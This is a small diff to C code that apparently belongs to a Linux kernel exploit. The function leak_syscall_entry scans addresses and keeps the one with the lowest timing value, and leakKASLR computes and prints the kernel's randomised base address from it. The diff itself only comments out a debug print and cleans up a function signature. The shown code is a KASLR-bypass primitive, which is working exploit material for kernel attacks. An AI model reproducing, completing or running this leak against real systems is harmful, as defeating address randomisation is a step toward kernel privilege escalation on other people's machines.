@@ -50,14 +50,13 @@ uint64_t leak_syscall_entry(void)
             min = data[i];
             addr = SCAN_START + i * STEP;
         }
-        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
     }
 
     return addr;
 }
 
-int leakKASLR()
-{
+int leakKASLR(void){
     printf ("KASLR base %llx\n", leak_syscall_entry() - entry_SYSCALL_64_offset);
 }
 
